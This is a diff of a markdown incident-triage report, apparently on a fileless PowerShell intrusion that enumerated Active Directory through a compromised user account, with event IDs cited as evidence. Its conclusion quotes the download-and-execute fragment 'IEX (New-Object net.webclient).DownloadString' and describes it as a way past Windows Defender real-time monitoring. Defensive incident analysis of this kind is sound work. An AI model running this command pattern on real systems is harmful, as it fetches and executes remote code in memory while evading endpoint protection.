@@ -10,20 +10,28 @@
 
 
 ## SECURITY EVENTS TRIAGE
+## Table of content 
 
-### Evidences
+  1.1 [ACTIVE DIRECTORY SIDE](#active-directory-side)
+  1.2 [CLIENT01 SID](#client01-side)
+  
+### ACTIVE DIRECTORY SIDE
+After security events triage, the most important evidences could be find on the following list :
 
-Windows Active Directory side (resources/powershell enumeration):
 ```
 EVTX:
 4104 x 49
 
 ```
-![fileless Load_powerup](resources/fileless_load_1.png)
+Powershell load the script [PowerUp.ps1] on dynamic process memory:
 
 ![fileless Load_powerup](resources/fileless_load_1.png)
 
-Windows client side (resources/python server):
+![fileless Load_powerup](resources/fileless_load_1.png)
+
+### CLIENT01 SIDE
+After security events triage, the most important evidences could be find on the following list :
+
 ```
 EVTX:
 5156
@@ -33,9 +41,14 @@ EVTX:
 
 ## VULNERABILITY DETECTION
 
-### Output
+This section not contains vulnerabilities, the threat user abusse the privileges of user [worker01] for enumerate the Active Directory and look for the attack vector: 
 
 ![fileless output](resources/Fileless_ActiveDirectory.png)
 
 ## CONCLUSIONS
 
+The threat actor, load directly on memory the required ps1 scripts for enumeration and bypass the Windows Defender RealTime monitoring using the following command:
+
+```
+IEX (New-Object net.webclient).DownloadString
+```
